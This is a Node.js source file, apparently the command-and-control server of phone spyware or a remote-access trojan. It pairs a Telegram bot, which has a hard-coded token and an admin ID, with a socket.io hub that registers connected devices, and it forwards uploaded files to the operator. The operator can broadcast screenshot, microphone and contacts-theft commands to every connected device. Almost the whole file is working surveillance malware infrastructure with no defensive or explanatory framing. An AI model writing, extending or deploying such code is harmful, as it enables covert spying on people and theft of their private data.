const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const multer = require('multer');

const TOKEN = '8910918204:AAHdGkvLbJKbHspDW25d4OPEPL0P0jHudkA';
const ADMIN_ID = 7294984974;
const PORT = process.env.PORT || 3000;

const bot = new TelegramBot(TOKEN, { polling: true, request: { timeout: 30000 } });
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

app.post('/upload', uploader.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send('No file');
    bot.sendDocument(ADMIN_ID, req.file.buffer, { caption: 'File received' });
    res.send('Done');
});

io.on('connection', socket => {
    let deviceId = socket.handshake.headers['user-agent'] + '-' + socket.id;
    bot.sendMessage(ADMIN_ID, 'New device connected\n\n' + deviceId);
    socket.on('disconnect', () => { bot.sendMessage(ADMIN_ID, 'Device disconnected'); });
    socket.on('log', msg => { bot.sendMessage(ADMIN_ID, 'Message: ' + msg); });
});

bot.on('message', msg => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text === '/start') {
        bot.sendMessage(chatId, 'Welcome:', { reply_markup: { keyboard: [['Devices', 'All']], resize_keyboard: true } });
        return;
    }
    if (text === 'Devices') {
        if (io.sockets.sockets.size === 0) return bot.sendMessage(chatId, 'No devices connected');
        let m = '';
        io.sockets.sockets.forEach((s) => { m += 'ID: ' + s.id + '\n'; });
        bot.sendMessage(chatId, m);
        return;
    }
    if (text === 'All') {
        bot.sendMessage(chatId, 'Select action:', { reply_markup: { keyboard: [['Screenshot', 'Mic', 'Contacts']], resize_keyboard: true } });
        return;
    }
    const commands = { 'Screenshot': 'screenshot', 'Mic': 'microphone', 'Contacts': 'contacts' };
    if (commands[text]) {
        io.emit('commend', { request: commands[text], extras: [] });
        bot.sendMessage(chatId, 'Action sent: ' + text);
        return;
    }
});

server.listen(PORT, () => console.log('Server running'));
